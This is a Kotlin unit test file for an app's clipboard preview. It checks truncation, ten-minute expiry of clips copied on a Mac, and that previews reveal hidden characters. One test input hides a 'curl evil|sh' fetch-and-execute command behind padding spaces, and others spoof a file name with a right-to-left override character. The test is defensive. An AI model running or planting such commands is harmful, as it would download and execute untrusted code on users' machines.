// SPDX-License-Identifier: AGPL-3.0-only
package com.avetero.seam.feature.clipboard

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/** What the screens show of a clip. The rules for what crosses are tested in the core. */
class ClipPreviewTest {
    @Test fun sharePreviewIsShort() {
        assertEquals("short", ClipPreview.preview("short"))
        val long = "x".repeat(1000)
        assertEquals(301, ClipPreview.preview(long).length)
        assertEquals(700, ClipPreview.notShown(long))
        assertEquals(0, ClipPreview.notShown("short"))
    }

    @Test fun sr_11_03_thePreviewShowsWhatWouldBeHidden() {
        val trick = "https://example.com" + " ".repeat(250) + "; curl evil|sh"
        val shown = ClipPreview.preview(trick)
        assertTrue(shown, shown.contains("⟨250 spaces⟩"))
        assertTrue(shown, shown.contains("curl evil"))
        assertTrue(ClipPreview.preview("safe‮txt.exe").contains("⟨U+202E⟩"))
        assertTrue(ClipPreview.preview("a​b").contains("⟨U+200B⟩"))
        assertTrue(ClipPreview.preview("a" + "\n".repeat(40) + "b").contains("⟨40 line breaks⟩"))
        assertEquals("normal text\nwith a line", ClipPreview.preview("normal text\nwith a line"))
    }

    @Test fun sr_11_09_aMacCopyStopsShowingAfterTenMinutes() {
        val clip = FromMac("secret", at = 1_000)
        assertTrue(clip.fresh(1_000))
        assertTrue(clip.fresh(1_000 + FromMac.SHOWN_MS - 1))
        assertFalse(clip.fresh(1_000 + FromMac.SHOWN_MS))
        assertFalse("a clock set back doesn't keep it", clip.fresh(0))
    }
}
